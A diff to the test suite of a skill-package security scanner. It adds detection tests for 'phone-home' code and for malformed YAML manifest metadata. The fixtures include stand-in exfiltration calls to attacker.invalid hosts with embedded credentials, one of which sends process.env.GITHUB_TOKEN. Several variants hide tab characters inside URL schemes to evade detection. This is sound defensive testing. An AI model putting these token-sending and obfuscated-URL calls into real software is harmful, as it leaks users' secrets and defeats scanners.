@@ -102,14 +102,21 @@ describe("phone-home", () => {
         'fetch("https://user:pass@collector.attacker.invalid/upload?token=secret#part");',
         'new WebSocket("wss://socket-user:socket-pass@socket.attacker.invalid/ws?key=secret#part");',
         'connect("ipc://ipc-user:ipc-pass@channel/run?key=secret#part");',
+        'eval("ipc:opaque-user:opaque-pass@channel/run?opaque=secret#part");',
+        'fetch("h\tttps://tab-user:tab-pass@tab.attacker.invalid/a?tab=secret#part", {body: process.env.GITHUB_TOKEN});',
+        'fetch("https:\t//slash-user:slash-pass@slash.attacker.invalid/a?slash=secret#part");',
+        'new WebSocket("w\tss://tab-socket-user:tab-socket-pass@tab-socket.attacker.invalid/ws?tab=secret#part");',
+        'eval("i\tpc://tab-ipc-user:tab-ipc-pass@tab-channel/run?tab=secret#part");',
       ].join("\n"),
     });
     try {
       const findings = (await scan(tmp.root)).findings;
       const serialized = JSON.stringify(findings);
       expect(serialized).toMatch(/collector\.attacker\.invalid|socket\.attacker\.invalid/);
+      expect(serialized).toMatch(/tab\.attacker\.invalid|tab-socket\.attacker\.invalid/);
+      expect(serialized).toMatch(/slash\.attacker\.invalid/);
       expect(serialized).not.toMatch(
-        /user:pass|socket-user|socket-pass|ipc-user|ipc-pass|token=secret|key=secret|#part/,
+        /user:pass|socket-user|socket-pass|ipc-user|ipc-pass|opaque-user|opaque-pass|tab-user|tab-pass|slash-user|slash-pass|tab-socket-user|tab-socket-pass|tab-ipc-user|tab-ipc-pass|token=secret|key=secret|opaque=secret|tab=secret|slash=secret|#part/,
       );
     } finally {
       await tmp.cleanup();
@@ -713,7 +720,7 @@ describe("manifest", () => {
         "name: valid-inline-comments",
         'description: "literal # text" # actual comment',
         "license: !!str MIT # actual comment",
-        'metadata: {skillvet.allowed-domains: "api.example.com,cdn.example.com"} # actual comment',
+        'metadata: {"42": "author", skillvet.allowed-domains: "api.example.com,cdn.example.com"} # actual comment',
         "---",
       ].join("\n"),
     });
@@ -734,6 +741,24 @@ describe("manifest", () => {
         "description: merge metadata key",
         "metadata:",
         "  <<: {author: [bad]}",
+        "---",
+      ].join("\n"),
+    });
+    const invalidMetadataKeys = await withTempSkill({
+      "SKILL.md": [
+        "---",
+        "name: invalid-metadata-keys",
+        "description: non-string metadata keys",
+        "metadata: {42: author, true: author, null: author}",
+        "---",
+      ].join("\n"),
+    });
+    const invalidTaggedMetadata = await withTempSkill({
+      "SKILL.md": [
+        "---",
+        "name: invalid-tagged-metadata",
+        "description: collection-tagged metadata",
+        "metadata: !!set {author}",
         "---",
       ].join("\n"),
     });
@@ -791,6 +816,11 @@ describe("manifest", () => {
         expect.objectContaining({ message: expect.stringMatching(/metadata.*string/i) }),
       );
       expect((await scan(invalidMergeMetadata.root)).verdict).not.toBe("GREEN");
+      expect(checkManifest(invalidMetadataKeys.ctx).findings).toContainEqual(
+        expect.objectContaining({ message: expect.stringMatching(/metadata.*string/i) }),
+      );
+      expect((await scan(invalidMetadataKeys.root)).verdict).not.toBe("GREEN");
+      expect((await scan(invalidTaggedMetadata.root)).verdict).not.toBe("GREEN");
     } finally {
       await valid.cleanup();
       await invalid.cleanup();
@@ -804,6 +834,8 @@ describe("manifest", () => {
       await validInlineComments.cleanup();
       await invalidQuotedMetadata.cleanup();
       await invalidMergeMetadata.cleanup();
+      await invalidMetadataKeys.cleanup();
+      await invalidTaggedMetadata.cleanup();
     }
   });
 
